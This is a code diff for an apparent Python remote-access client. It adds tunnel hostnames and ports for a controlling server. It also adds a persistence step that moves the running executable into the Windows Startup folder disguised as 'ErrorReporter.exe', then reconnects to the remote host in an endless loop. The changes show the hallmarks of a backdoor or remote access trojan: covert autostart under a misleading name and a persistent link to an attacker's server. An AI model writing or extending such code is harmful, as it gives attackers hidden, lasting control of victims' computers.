@@ -33,6 +33,12 @@ SERVER_HOST = ~hostname~
 TRANSFER_HOST = ~tname~
 TRANSFER_PORT = ~tport~
 SERVER_PORT = ~port~
+
+#SERVER_HOST = "pst-tramadol.at.ply.gg"
+#TRANSFER_HOST = "war-cow.at.ply.gg"
+#TRANSFER_PORT = 54017
+#SERVER_PORT = 38363
+
 BUFFER_SIZE = 4096
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
@@ -474,22 +480,25 @@ if __name__ == "__main__":
     #       client.start()
     #   except Exception as e:
     #       print(e)
-    isrunning = checkifrunning()
-    if isrunning:
-        easygui.msgbox("an instance is already running")
-        sys.exit(1)
-    while True:
-        try:
-            client = Client(SERVER_HOST, SERVER_PORT, verbose=True)
-            dc = client.start()
-            if dc:
+    if original:
+        shutil.move(sys.argv[0], f"C:/Users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/ErrorReporter.exe")
+    else:
+        isrunning = checkifrunning()
+        if isrunning:
+            easygui.msgbox("an instance is already running")
+            sys.exit(1)
+        while True:
+            try:
+                client = Client(SERVER_HOST, SERVER_PORT, verbose=True)
+                dc = client.start()
+                if dc:
+                    break
+            except KeyboardInterrupt as KI:
+                #print(KI)
                 break
-        except KeyboardInterrupt as KI:
-            #print(KI)
-            break
-        except Exception as e:
-            print(e)
-            # disconnected or unable to connect
-            # retry
-            del client
-            pass
+            except Exception as e:
+                print(e)
+                # disconnected or unable to connect
+                # retry
+                del client
+                pass
